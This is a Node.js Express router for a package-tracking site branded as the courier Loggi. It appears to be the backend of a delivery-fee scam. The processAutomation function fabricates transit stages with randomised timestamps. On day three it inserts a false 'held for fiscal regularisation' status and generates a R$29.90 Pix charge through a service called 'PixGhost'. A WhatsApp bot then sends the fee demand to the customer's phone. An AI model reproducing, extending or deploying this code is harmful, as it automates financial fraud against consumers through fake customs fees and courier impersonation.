const express = require('express');
const router = express.Router();
const { getDB } = require('../db');
const axios = require('axios');

// Endpoint de configuração para o frontend
router.get('/config/centavos', (req, res) => {
    res.json({ active: true });
});

// ===== HELPERS =====

// Enviar mensagem WhatsApp automaticamente via bot integrado
async function notificarClienteWA(codigo, mensagem, db) {
    try {
        const bot = global._bot;
        if (!bot || !bot.isReady || !bot.sendWhatsAppMessage) return;

        let phone = null;
        if (db) {
            const [rows] = await db.query(
                'SELECT cliente_whatsapp FROM rastreios_status WHERE codigo = ? AND cliente_whatsapp IS NOT NULL LIMIT 1',
                [codigo]
            );
            if (rows.length && rows[0].cliente_whatsapp) {
                phone = String(rows[0].cliente_whatsapp).replace(/\D/g, '');
            }
        }
        if (!phone || phone.length < 10) return;

        await bot.sendWhatsAppMessage(phone, mensagem);
        console.log(`[WA AUTO] Notificacao enviada para ${phone} (${codigo})`);
    } catch (err) {
        console.error('[WA AUTO ERROR]', err.message);
    }
}

async function processAutomation(codigo, db) {
    console.log(`[AUTOMATION] Verificando automação para: ${codigo}`);
    const [rows] = await db.query(
        'SELECT * FROM rastreios_status WHERE codigo = ? ORDER BY data ASC',
        [codigo]
    );

    if (rows.length === 0) return null;

    const packageData = rows[0];
    const firstStageDate = packageData.data ? new Date(packageData.data) : null;
    // Se data for nula ou inválida, não é possível calcular automação
    if (!firstStageDate || isNaN(firstStageDate.getTime())) {
        console.log(`[AUTOMATION] Skipping ${codigo} - data inválida ou nula`);
        return null;
    }
    const now = new Date();
    const diffDays = Math.floor((now.getTime() - firstStageDate.getTime()) / (1000 * 60 * 60 * 24));
    const city = packageData.cidade;

    const automationStages = [
        { day: 1, status: '🚚 Em trânsito', title: '🚚 Em trânsito', sub: 'Seu objeto está sendo transportado entre unidades.' },
        { day: 2, status: '🏢 No centro de distribuição', title: '🏢 No centro de distribuição', sub: 'O objeto chegou na unidade de tratamento da sua região.' }
    ];

    let updated = false;

    // Adicionar etapas automáticas de trânsito
    for (const stage of automationStages) {
        if (diffDays >= stage.day && !rows.some(r => r.status_atual === stage.status)) {
            console.log(`[AUTOMATION] Inserindo etapa automática: ${stage.status}`);
            const stageDate = new Date(firstStageDate);
            stageDate.setDate(stageDate.getDate() + stage.day);
            stageDate.setHours(9 + Math.floor(Math.random() * 8), Math.floor(Math.random() * 59));

            await db.query(
                'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, tipo_entrega, taxa_paga, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                [codigo, city, stage.status, stage.title, stage.sub, packageData.tipo_entrega, packageData.taxa_paga, stageDate]
            );
            updated = true;
        }
    }

    // Se for NORMAL e passaram 3 dias e não está pago -> Taxa no Dia 3
    if (packageData.tipo_entrega === 'NORMAL' && diffDays >= 3 && !packageData.taxa_paga) {
        const taxaStatus = '⚠️ Objeto retido - Aguardando regularização fiscal';
        if (!rows.some(r => r.status_atual === taxaStatus)) {
            console.log('[AUTOMATION] Condição de taxa atingida. Verificando PixGhost...');

            let taxaPixEmv = packageData.taxa_pix || null;

            if (!taxaPixEmv) {
                try {
                    const PIXGHOST_URL = process.env.PIXGHOST_API_URL || 'https://pixghost.site/api.php';
                    const PIXGHOST_KEY = process.env.PIXGHOST_API_KEY || '';

                    const pixRes = await axios.post(PIXGHOST_URL, {
                        amount: 29.90
                    }, {
                        headers: {
                            'Authorization': `Bearer ${PIXGHOST_KEY}`,
                            'Content-Type': 'application/json'
                        },
                        timeout: 10000
                    });

                    if (pixRes.data && pixRes.data.success && (pixRes.data.pix_code || pixRes.data.qr_code)) {
                        taxaPixEmv = pixRes.data.pix_code || pixRes.data.qr_code || pixRes.data.emv;
                        console.log(`[PIXGHOST AUTO] Pix gerado para ${codigo}`);
                    }
                } catch (pixErr) {
                    console.error('[PIXGHOST AUTO ERROR]', pixErr.response?.data || pixErr.message);
                }
            }

            const taxaDate = new Date(firstStageDate);
            taxaDate.setDate(taxaDate.getDate() + 3);
            taxaDate.setHours(11 + Math.floor(Math.random() * 4), Math.floor(Math.random() * 59));

            await db.query(
                'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, taxa_pix, tipo_entrega, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                [codigo, city, taxaStatus, taxaStatus, 'Seu objeto está sujeito a retenção por irregularidade fiscal. Regularize para liberar.', 29.90, taxaPixEmv, 'NORMAL', taxaDate]
            );
            updated = true;

            // [B] Auto-notificar cliente sobre taxa retida
            const pixInfo = taxaPixEmv
                ? `\n\n📋 *PIX Copia e Cola:*\n\`${taxaPixEmv.substring(0, 100)}\`\n\n👉 Ou acesse o site para pagar via QR Code.`
                : '\n\n👉 Acesse o site para visualizar e pagar a taxa.';
            await notificarClienteWA(codigo,
                `⚠️ *ATENÇÃO — Objeto Retido*\n\n` +
                `*Código:* ${codigo}\n` +
                `*Destino:* ${city}\n\n` +
                `Seu objeto foi retido na alfândega e necessita de regularização fiscal.\n\n` +
                `💰 *Taxa:* R$ 29,90` +
                pixInfo +
                `\n\n_Loggi — Rastreamento Inteligente_`,
                db
            );
        }
    }

    return updated;
}

// ===== TRACKING API =====

// Listar todos (Admin) - Apenas o status mais recente de cada código único
router.get('/rastreios', async (req, res) => {
    const db = getDB();
    try {
        if (!db) throw new Error('Banco de dados não disponível');

        // Buscar códigos únicos
        const [uniqueRows] = await db.query('SELECT DISTINCT codigo FROM rastreios_status');

        // Processar automação para cada um (pode ser otimizado futuramente para apenas ativos)
        for (const row of uniqueRows) {
            await processAutomation(row.codigo, db);
        }

        const [rows] = await db.query(`
            SELECT t1.*
            FROM rastreios_status t1
            WHERE t1.id = (
                SELECT id FROM rastreios_status t2
                WHERE t2.codigo = t1.codigo
                ORDER BY
                    CASE
                        WHEN t2.status_atual LIKE '%Entregue%' THEN 6
                        WHEN t2.status_atual LIKE '%saiu%' OR t2.status_atual LIKE '%rota%' THEN 5
                        WHEN t2.status_atual LIKE '%retido%' THEN 4
                        WHEN t2.status_atual LIKE '%distribuição%' OR t2.status_atual LIKE '%centro%' THEN 3
                        WHEN t2.status_atual LIKE '%trânsito%' OR t2.status_atual LIKE '%transito%' THEN 2
                        ELSE 1
                    END DESC,
                    t2.id DESC
                LIMIT 1
            )
            ORDER BY t1.data DESC
        `);
        res.json(rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Detalhes (Admin)
router.get('/rastreios/:codigo/detalhes', async (req, res) => {
    const db = getDB();
    const { codigo } = req.params;
    try {
        if (!db) throw new Error('Banco de dados não disponível');
        const [rows] = await db.query('SELECT * FROM rastreios_status WHERE codigo = ? ORDER BY data DESC', [codigo]);
        if (rows.length === 0) return res.status(404).json({ error: 'Rastreio não encontrado' });

        const latest = rows[0];
        res.json({
            codigo: latest.codigo,
            cidade: latest.cidade,
            data_inicial: latest.data,
            taxa_valor: latest.taxa_valor,
            taxa_pix: latest.taxa_pix,
            tipo_entrega: latest.tipo_entrega,
            taxa_paga: latest.taxa_paga,
            etapas: rows.map(r => r.status_atual),
            cliente_nome: latest.cliente_nome || null,
            cliente_whatsapp: latest.cliente_whatsapp || null,
            cliente_notificar: !!(latest.cliente_whatsapp)
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Notificar cliente via WhatsApp
router.post('/rastreios/:codigo/notificar', async (req, res) => {
    const db = getDB();
    const { codigo } = req.params;
    const { phone: phoneOverride } = req.body;
    try {
        if (!db) throw new Error('DB não conectado');

        // Buscar dados do rastreio
        const [rows] = await db.query(
            'SELECT * FROM rastreios_status WHERE codigo = ? ORDER BY data DESC LIMIT 1',
            [codigo]
        );
        if (rows.length === 0) return res.json({ success: false, message: 'Rastreio não encontrado.' });
        const r = rows[0];

        // Resolver número de telefone
        let phone = phoneOverride
            ? String(phoneOverride).replace(/\D/g, '')
            : r.cliente_whatsapp
                ? String(r.cliente_whatsapp).replace(/\D/g, '')
                : null;

        if (!phone || phone.length < 10) {
            return res.json({ success: false, message: 'Número do cliente não cadastrado neste rastreio. Edite o rastreio e informe o WhatsApp do cliente.' });
        }

        // Verificar bot
        const bot = global._bot;
        if (!bot || !bot.isReady || !bot.sendWhatsAppMessage) {
            return res.json({ success: false, message: 'Bot desconectado. Acesse Bot WhatsApp no menu e conecte primeiro.' });
        }

        // Montar mensagem com status atual
        const siteUrl = process.env.SITE_URL || 'https://palevioletred-crow-490097.hostingersite.com';
        const link = `${siteUrl}/#/rastreio/${codigo}`;
        const nomeCliente = r.cliente_nome ? `*${r.cliente_nome.split(' ')[0]}*` : 'cliente';

        const msg =
            `📦 *Atualização do seu Rastreio*\n\n` +
            `Olá, ${nomeCliente}! Aqui está a situação atual do seu pedido:\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🏷️ *Código:* ${codigo}\n` +
            `📍 *Destino:* ${r.cidade || 'Não informado'}\n` +
            `📊 *Status atual:* ${r.status_atual || 'Em processamento'}\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `🔍 *Acompanhe em tempo real:*\n` +
            `${link}\n\n` +
            `Qualquer dúvida, fale conosco:\n` +
            `📲 *WhatsApp: (51) 99614-8568*\n\n` +
            `_Loggi — Rastreamento Inteligente_ 🚚`;

        await bot.sendWhatsAppMessage(phone, msg);
        console.log(`[NOTIFICAR] Mensagem enviada para ${phone} (${codigo})`);
        res.json({ success: true, message: `✅ Mensagem enviada para ${phone}!` });

    } catch (err) {
        console.error('[NOTIFICAR ERROR]', err.message);
        res.status(500).json({ success: false, message: `Erro: ${err.message}` });
    }
});

// Criar
router.post('/rastreios', async (req, res) => {
    const db = getDB();
    try {
        if (!db) throw new Error('Banco de dados não disponível');
        const { codigo, cidade, status_atual, taxa_valor, taxa_pix, tipo_entrega, cliente_nome, cliente_whatsapp } = req.body;

        await db.query(
            'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, taxa_pix, tipo_entrega, cliente_nome, cliente_whatsapp, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())',
            [codigo, cidade, status_atual || '📦 Objeto postado', status_atual || '📦 Objeto postado', 'Seu objeto foi postado com sucesso.', taxa_valor, taxa_pix, tipo_entrega || 'NORMAL', cliente_nome || null, cliente_whatsapp || null]
        );
        // [D] Mensagem de boas-vindas ao criar rastreio com WhatsApp
        if (cliente_whatsapp) {
            const phone = String(cliente_whatsapp).replace(/\D/g, '');
            if (phone.length >= 10) {
                try {
                    const bot = global._bot;
                    if (bot && bot.isReady && bot.sendWhatsAppMessage) {
                        await bot.sendWhatsAppMessage(phone,
                            `📦 *Rastreio Cadastrado!*\n\n` +
                            `Olá${cliente_nome ? `, *${cliente_nome}*` : ''}!\n\n` +
                            `*Código:* ${codigo}\n` +
                            `*Destino:* ${cidade}\n` +
                            `*Modalidade:* ${tipo_entrega || 'NORMAL'}\n\n` +
                            `Você receberá atualizações automáticas aqui quando o status mudar.\n\n` +
                            `_Loggi — Rastreamento Inteligente_`
                        );
                    }
                } catch (e) { /* silencioso */ }
            }
        }

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Notificar cliente via WhatsApp Bot
router.post('/rastreios/:codigo/notificar', async (req, res) => {
    const db = getDB();
    const { codigo } = req.params;
    try {
        if (!db) throw new Error('Banco de dados não disponível');

        const [rows] = await db.query(
            'SELECT codigo, cidade, status_atual, taxa_valor, cliente_nome, cliente_whatsapp FROM rastreios_status WHERE codigo = ? ORDER BY data DESC LIMIT 1',
            [codigo]
        );
        if (!rows.length) return res.json({ success: false, message: 'Rastreio não encontrado' });

        const r = rows[0];
        const phone = (req.body.phone || r.cliente_whatsapp || '').replace(/\D/g, '');
        if (!phone || phone.length < 10) {
            return res.json({ success: false, message: 'Número de WhatsApp não cadastrado para este rastreio. Edite o rastreio e adicione o número do cliente.' });
        }

        const bot = global._bot;
        if (!bot || !bot.isReady) {
            return res.json({ success: false, message: 'Bot WhatsApp não está conectado. Acesse Bot WhatsApp no menu e conecte primeiro.' });
        }

        const taxa = Number(r.taxa_valor) > 0 ? `\n\n⚠️ *Taxa pendente:* R$ ${Number(r.taxa_valor).toFixed(2)}\nAcesse o site para regularizar e liberar seu objeto.` : '';
        const msg =
            `📦 *Atualização do seu Rastreio*\n\n` +
            `*Código:* ${r.codigo}\n` +
            `*Status:* ${r.status_atual}\n` +
            `*Destino:* ${r.cidade || 'N/A'}` +
            taxa +
            `\n\n_Loggi — Rastreamento Inteligente_`;

        await bot.sendWhatsAppMessage(phone, msg);

        // Salvar número se veio via req.body
        if (req.body.phone && req.body.phone !== r.cliente_whatsapp) {
            await db.query('UPDATE rastreios_status SET cliente_whatsapp = ? WHERE codigo = ?', [phone, codigo]);
        }

        res.json({ success: true, message: `Mensagem enviada para ${phone}` });
    } catch (err) {
        console.error('[NOTIFICAR WA]', err.message);
        res.json({ success: false, message: 'Erro ao enviar: ' + err.message });
    }
});

// Atualizar
router.put('/rastreios/:codigo', async (req, res) => {
    const db = getDB();
    const { codigo } = req.params;
    const { cidade, taxa_valor, taxa_pix, tipo_entrega, etapas, cliente_nome, cliente_whatsapp } = req.body;
    try {
        if (!db) throw new Error('Banco de dados não disponível');

        await db.query(
            'UPDATE rastreios_status SET cidade = ?, taxa_valor = ?, taxa_pix = ?, tipo_entrega = ?, cliente_nome = ?, cliente_whatsapp = ? WHERE codigo = ?',
            [cidade, taxa_valor, taxa_pix, tipo_entrega, cliente_nome ?? null, cliente_whatsapp ?? null, codigo]
        );

        if (Array.isArray(etapas)) {
            const [existingRows] = await db.query('SELECT status_atual FROM rastreios_status WHERE codigo = ?', [codigo]);
            const existingStatuses = existingRows.map(r => r.status_atual);

            for (const status of etapas) {
                if (!existingStatuses.includes(status)) {
                    await db.query(
                        'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, tipo_entrega) VALUES (?, ?, ?, ?, ?, ?)',
                        [codigo, cidade, status, status, status, tipo_entrega]
                    );
                }
            }
            for (const oldStatus of existingStatuses) {
                if (!etapas.includes(oldStatus)) {
                    await db.query('DELETE FROM rastreios_status WHERE codigo = ? AND status_atual = ?', [codigo, oldStatus]);
                }
            }
        }

        // [A] Auto-notificar cliente sobre atualização de status
        const [latestRows] = await db.query(
            'SELECT status_atual, cidade, cliente_whatsapp FROM rastreios_status WHERE codigo = ? ORDER BY data DESC LIMIT 1',
            [codigo]
        );
        if (latestRows.length && latestRows[0].cliente_whatsapp) {
            const latestStatus = latestRows[0].status_atual;
            const latestCidade = latestRows[0].cidade;
            await notificarClienteWA(codigo,
                `📦 *Atualização do seu Rastreio*\n\n` +
                `*Código:* ${codigo}\n` +
                `*Status:* ${latestStatus}\n` +
                `*Destino:* ${latestCidade || cidade}\n\n` +
                `_Loggi — Rastreamento Inteligente_`,
                db
            );
        }

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Deletar
router.delete('/rastreios/:codigo', async (req, res) => {
    const db = getDB();
    const { codigo } = req.params;
    try {
        if (!db) throw new Error('Banco de dados não disponível');
        await db.query('DELETE FROM rastreios_status WHERE codigo = ?', [codigo]);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Stats
router.get('/stats', async (req, res) => {
    const db = getDB();
    try {
        if (!db) throw new Error('Banco de dados não disponível');
        const [total] = await db.query('SELECT COUNT(DISTINCT codigo) as count FROM rastreios_status');
        const [entregues] = await db.query('SELECT COUNT(DISTINCT codigo) as count FROM rastreios_status WHERE status_atual LIKE "%Entregue%"');
        const [com_taxa] = await db.query('SELECT COUNT(DISTINCT codigo) as count FROM rastreios_status WHERE taxa_valor > 0');

        res.json({
            total: total[0].count,
            entregues: entregues[0].count,
            com_taxa: com_taxa[0].count,
            sem_taxa: total[0].count - com_taxa[0].count
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Public Search (Home & Tracking) com Automação
router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => {
    const db = getDB();
    try {
        console.log('--- NOVA BUSCA PÚBLICA ---');
        if (!db) throw new Error('Banco de dados não disponível');
        let { codigo } = req.body;
        if (!codigo) return res.status(400).json({ success: false, message: 'Código é obrigatório' });

        codigo = codigo.toUpperCase().trim();
        console.log(`Buscando código: ${codigo}`);

        // Rodar Automação
        await processAutomation(codigo, db);

        // Buscar dados atualizados
        const [currentRows] = await db.query(
            'SELECT * FROM rastreios_status WHERE UPPER(TRIM(codigo)) = ? ORDER BY data ASC',
            [codigo]
        );

        if (currentRows.length === 0) {
            console.log(`Código ${codigo} não encontrado.`);
            return res.status(404).json({ success: false, message: 'Código de rastreio não encontrado.' });
        }

        const packageData = currentRows[0];
        const lastStatus = currentRows[currentRows.length - 1];
        const taxaRow = currentRows.find(r => (r.taxa_valor && parseFloat(r.taxa_valor) > 0) || r.taxa_pix);

        console.log('Preparando resposta JSON...');
        const responseData = {
            success: true,
            codigo: lastStatus.codigo,
            status_atual: lastStatus.status_atual,
            cidade: packageData.cidade || null,
            cliente_nome: packageData.cliente_nome || null,
            etapas: currentRows.map(r => ({
                titulo: r.titulo || r.status_atual,
                subtitulo: r.subtitulo || '',
                data: r.data,
                status_atual: r.status_atual
            })),
            taxa_valor: packageData.taxa_paga ? null : (taxaRow?.taxa_valor || null),
            taxa_pix: packageData.taxa_paga ? null : (taxaRow?.taxa_pix || null),
            tipo_entrega: packageData.tipo_entrega,
            taxa_paga: packageData.taxa_paga ? true : false
        };

        console.log('Enviando resposta com sucesso.');
        res.json(responseData);
    } catch (error) {
        console.error('--- ERRO CRÍTICO NA BUSCA ---');
        console.error(error);
        res.status(500).json({ success: false, error: 'Internal Server Error', message: error.message });
    }
});

module.exports = router;
module.exports.processAutomation = processAutomation;
